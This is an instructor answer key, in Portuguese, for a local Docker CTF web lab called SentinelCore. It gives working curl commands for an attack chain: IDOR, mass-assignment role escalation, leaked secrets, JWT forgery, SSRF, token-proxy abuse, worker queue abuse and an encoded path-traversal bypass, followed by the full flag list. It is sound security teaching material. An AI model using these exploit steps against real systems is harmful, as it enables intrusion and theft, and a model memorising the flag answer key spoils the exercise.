# Walkthrough - Lab 04 SentinelCore

Gabarito completo para instrutores do **Lab 04 - SentinelCore**. Use o fluxo manual como narrativa principal em aula e os comandos `curl` como validacao alternativa ou reproducao de requests capturadas no Burp.

## Escopo autorizado

```text
http://127.0.0.1:8094
```

Nao use este walkthrough contra qualquer alvo fora do ambiente local autorizado.

Somente a aplicacao principal publica porta no host. `internal-admin`, `redis` e `worker` ficam na rede Docker interna e aparecem na cadeia porque a propria aplicacao consegue conversar com eles.

## Como subir o lab

Dentro do repositorio:

```bash
cd ~/ctf-labs/lab-04-sentinelcore
docker compose up --build
```

Em outro terminal:

```bash
BASE=http://127.0.0.1:8094
COOKIE=/tmp/lab04-sentinel.cookies
```

## Credenciais iniciais

```text
intern / intern2026
```

## Visao geral da cadeia

A cadeia esperada combina varias falhas pequenas. Nenhuma delas entrega o lab inteiro sozinha; o ponto didatico e correlacionar pistas de objetos, roles, artefatos, rede interna e processamento assincrono.

1. Login inicial como `intern`.
2. Inspecao do JavaScript publico para mapear endpoints.
3. BOLA/IDOR em detalhes de alertas.
4. Mass Assignment para alterar a role para `analyst`.
5. Debug disclosure e build artifact leak para obter material sensivel.
6. JWT forgery para admin.
7. Acesso admin e SSRF para o servico `internal-admin`.
8. Proxy com `x-internal-token` para consultar endpoints internos.
9. Template context disclosure.
10. Queue poisoning / worker abuse e leitura de output do worker.
11. Arbitrary file read final para ler a flag em disco.

## 1. Login inicial

Acesse no navegador:

```text
http://127.0.0.1:8094
```

A tela inicial deve aparecer como uma **Threat Operations Console** do SentinelCore, com visual de SOC/Incident Response e credencial inicial do lab. A interface e responsiva para telas menores, mas o exercicio continua sendo web/API.

Entre com:

```text
intern / intern2026
```

Com `curl`:

```bash
curl -i -c "$COOKIE" \
  -d "username=intern" \
  -d "password=intern2026" \
  "$BASE/login"
```

Valide a sessao:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
```

O dashboard redesenhado mostra cards operacionais para fluxo de alertas, claims de identidade e telemetria do frontend. Ele deve exibir `user: intern`, `role: viewer`, links basicos e a nota de que nem todo fluxo interno aparece no menu.

O usuario inicial tem role `viewer`.

## 2. Inspecao do JavaScript

Abra DevTools no dashboard ou acesse diretamente:

```text
http://127.0.0.1:8094/static/js/sentinel.bundle.js
```

O bundle revela endpoints e formatos uteis:

- `/api/v2/alerts`
- `/api/v2/alerts/{id}`
- `/api/v2/me/profile`
- `/api/v2/debug/health`
- `/api/v2/artifacts/build-manifest`
- `/api/v2/integrations/check`
- `/api/v2/integrations/proxy`
- `/api/v2/reports/render`
- `/api/v2/jobs`
- `/api/v2/jobs/output?file={name}`
- `/api/v2/admin/diagnostics/read?file=app.log`

Tambem aparecem pistas sobre `internal-admin` e `sentinel:jobs`; o caminho de output compartilhado aparece depois, ao consultar a configuracao interna.

## 3. BOLA/IDOR

Liste os alertas visiveis para o usuario:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/alerts" | jq
```

A listagem filtra por `owner_id`. No navegador ou no Burp, abra um detalhe de alerta e altere o ID. Em seguida, leia diretamente um alerta de outro contexto:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/alerts/1002" | jq
```

O detalhe valida que o alerta existe, mas nao valida se pertence ao usuario atual.

Flag:

```text
flag{bola_alert_cross_tenant}
```

Pista relevante do alerta:

```text
Old debug health checks referenced auth material as sentinelcore-dev-****.
```

## 4. Mass Assignment para analyst

O bundle indica `PATCH /api/v2/me/profile`. O endpoint aceita JSON e bloqueia apenas alguns campos. Envie um campo extra `role`.

Com `curl`:

```bash
curl -i -b "$COOKIE" -c "$COOKIE" \
  -X PATCH "$BASE/api/v2/me/profile" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"SOC Intern","role":"analyst"}'
```

O app bloqueia `id`, `username`, `password` e rejeita `role=admin`, mas aceita `role=analyst` e emite novo JWT no cookie.

Valide a role efetiva:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
```

Flag:

```text
flag{mass_assignment_analyst_role}
```

## 5. Debug disclosure

Com role `analyst`, acesse:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/debug/health" | jq
```

Retorno esperado:

```json
{
  "status": "ok",
  "service": "sentinelcore-api",
  "build": "2026.05.lab04",
  "diagnostic": "Loaded auth secret: sentinelcore-dev-****",
  "flag": "flag{debug_secret_fragment_disclosed}"
}
```

Flag:

```text
flag{debug_secret_fragment_disclosed}
```

## 6. Build artifact leak

Ainda como `analyst`, acesse o manifesto antigo:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/artifacts/build-manifest" | jq
```

O artefato vazado contem:

```text
JWT_SECRET=sentinelcore-dev-2026
INTERNAL_ADMIN_TOKEN=internal-admin-token-7f3a9c21
```

Flag:

```text
flag{old_build_manifest_leaked_secrets}
```

Esses valores permitem as proximas etapas: forjar um JWT admin e autenticar no servico interno via proxy.

## 7. JWT forgery para admin

O cookie `token` e um JWT assinado com HS256. Com o segredo vazado, gere um token admin dentro do container da aplicacao:

```bash
export ADMIN_TOKEN=$(docker exec lab04-sentinel-app node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({id:1,username:'intern',role:'admin',scope:['admin:read']}, 'sentinelcore-dev-2026'))")
```

Confira se a variavel recebeu um JWT real:

```bash
echo "$ADMIN_TOKEN"
```

O valor deve ter tres partes separadas por ponto. Nao exporte um placeholder como texto literal.

## 8. Acesso admin

Use o token em `Authorization: Bearer` para acessar a area admin:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://127.0.0.1:8094/api/v2/admin/final | jq
```

Flag:

```text
flag{jwt_forged_admin_access}
```

A resposta tambem informa que a flag final esta em disco e exige uma primitiva de leitura.

## 9. SSRF para internal-admin

O endpoint de integracao aceita uma URL e bloqueia apenas alguns nomes obvios como `localhost` e `127.0.0.1`. O nome Docker `internal-admin` continua acessivel pela rede interna.

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/status"}' \
  "$BASE/api/v2/integrations/check" | jq
```

Flag:

```text
flag{ssrf_reached_internal_admin}
```

Impacto: a aplicacao principal consegue fazer requests para um servico que nao esta exposto no host.

## 10. Proxy com x-internal-token

O manifesto antigo vazou o token interno:

```text
internal-admin-token-7f3a9c21
```

O endpoint admin `/api/v2/integrations/proxy` aceita headers customizados. Envie `x-internal-token` para consultar o servico interno.

Usuarios internos:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/internal/users","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
  "$BASE/api/v2/integrations/proxy" | jq
```

Flag:

```text
flag{internal_admin_token_accepted}
```

Configuracao interna:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/internal/config","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
  "$BASE/api/v2/integrations/proxy" | jq
```

Flag:

```text
flag{internal_config_disclosed}
```

O config confirma a fila `sentinel:jobs`, tipos de job e output em `/shared`.

## 11. Template context disclosure

O renderizador de relatorios substitui placeholders simples, mas disponibiliza contexto sensivel.

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"debug","template":"user={{user.username}} role={{user.role}} secret={{config.jwt_hint}} internal={{config.internal_token_hint}}"}' \
  "$BASE/api/v2/reports/render" | jq
```

Flag:

```text
flag{template_context_leaked}
```

Licao: template context disclosure pode comprometer a cadeia mesmo sem execucao de codigo.

## 12. Queue poisoning / worker abuse

Agora enfileire um job `token.debug`:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"token.debug","source":"manual","output":"worker-token.txt"}' \
  "$BASE/api/v2/jobs" | jq
```

Aguarde o worker consumir:

```bash
sleep 2
```

## 13. Leitura de output do worker

Leia o output gerado no volume compartilhado:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/jobs/output?file=worker-token.txt"
```

Flag:

```text
flag{worker_queue_poisoned}
```

O output tambem revela `WORKER_TOKEN`.

Valide o tipo `report.export`:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"report.export","source":"case-1002","output":"case-1002.txt"}' \
  "$BASE/api/v2/jobs" | jq

sleep 2

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/jobs/output?file=case-1002.txt"
```

Valide tambem a primitiva insegura do worker `file.read`, limitada ao container do worker:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"file.read","source":"/worker/worker.js","output":"worker-source.txt"}' \
  "$BASE/api/v2/jobs" | jq

sleep 2

curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/jobs/output?file=worker-source.txt" | head
```

Essa etapa demonstra o risco de uma fila aceitar jobs controlados por usuario administrativo.

## 14. Arbitrary file read final

A area admin indicou que a flag final esta em disco. O bundle e o log apontam para:

```text
/api/v2/admin/diagnostics/read?file=app.log
base /app/logs
```

Leitura normal:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/admin/diagnostics/read?file=app.log"
```

Tentativa direta com traversal literal deve ser bloqueada:

```bash
curl -i -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/admin/diagnostics/read?file=../secrets/final.flag"
```

O filtro bloqueia apenas `../` antes do decode. Codifique a barra:

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$BASE/api/v2/admin/diagnostics/read?file=..%2fsecrets%2ffinal.flag"
```

Flag final:

```text
flag{sentinelcore_full_chain_compromised}
```

## 15. Lista de flags

```text
flag{bola_alert_cross_tenant}
flag{mass_assignment_analyst_role}
flag{debug_secret_fragment_disclosed}
flag{old_build_manifest_leaked_secrets}
flag{jwt_forged_admin_access}
flag{ssrf_reached_internal_admin}
flag{internal_admin_token_accepted}
flag{internal_config_disclosed}
flag{template_context_leaked}
flag{worker_queue_poisoned}
flag{sentinelcore_full_chain_compromised}
```

## 16. Validacao manual final

Use esta checagem no fim da aula ou antes de publicar o lab:

```bash
cd ~/ctf-labs/lab-04-sentinelcore
docker compose down --remove-orphans
docker compose up --build
```

Acesse:

```text
http://127.0.0.1:8094
```

Valide manualmente:

- tela de login com identidade de Threat Operations Console
- dashboard com `user`, `role`, cards operacionais e nota de investigacao
- links basicos para `/api/v2/alerts`, `/api/v2/me` e `sentinel.bundle.js`
- bundle JS disponivel e com pistas de investigacao
- fluxo de login `intern / intern2026`
- responsividade basica da interface em largura menor

## Troubleshooting

- Se aparecer "authentication required" em rotas admin, provavelmente o token nao foi enviado, esta vazio, expirou ou foi exportado errado.
- Nao usar literalmente `COLE_AQUI_O_TOKEN`.
- Conferir com `echo "$ADMIN_TOKEN"`.
- Gerar novamente o token com `docker exec` usando o comando da etapa de JWT forgery.
- Diferenca pratica: 401 com "authentication required" indica ausencia ou falha de autenticacao; 403 indica que o JWT foi aceito, mas a role ou permissao nao e suficiente.
- Se aparecer 403 em rota admin, o JWT pode ser valido, mas a role nao e admin.
- Para problema no worker, usar:

```bash
docker logs lab04-worker
```

- Se o output do worker nao aparecer, aguardar alguns segundos e conferir o nome do arquivo em `/api/v2/jobs/output?file=...`.
- Se a porta estiver ocupada, usar `docker ps` para identificar containers ativos e `docker compose down` dentro de `lab-04-sentinelcore`.
- Se a role analyst nao mudar, conferir se o `PATCH` salvou o novo cookie com `-c`.
- Se `/api/v2/debug/health` retornar 403, repita a etapa de Mass Assignment e valide `/api/v2/me`.
- Se a leitura final retornar 403, use `%2f` em vez de `/` no traversal.
- Se a leitura final retornar 404, confirme o caminho relativo a partir de `/app/logs`: `..%2fsecrets%2ffinal.flag`.
